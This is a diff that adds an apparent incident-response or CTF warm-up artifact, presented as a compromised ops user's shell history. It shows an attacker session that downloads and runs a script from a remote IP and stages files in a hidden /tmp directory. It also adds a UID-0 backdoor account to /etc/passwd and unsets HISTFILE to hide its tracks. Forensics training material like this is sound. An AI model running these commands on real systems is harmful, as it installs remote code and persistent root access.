@@ -1,0 +1,10 @@
+# ops 用户的命令历史（导出于排查时）
+cd /tmp
+wget http://198.51.100.23:8000/s.sh
+chmod +x s.sh && ./s.sh
+mkdir -p /tmp/.cfg/bin
+echo 'IyEvYmluL3NoCnNsZWVwIDMwMDA=' | base64 -d > /tmp/.cfg/bin/run
+echo ZmxhZ3tpcl93YXJtdXBfZXhlY3V0ZWR9 | base64 -d > /tmp/.cfg/flag.txt
+echo 'svcpatch:x:0:0:patch:/root:/bin/bash' >> /etc/passwd
+unset HISTFILE
+exit
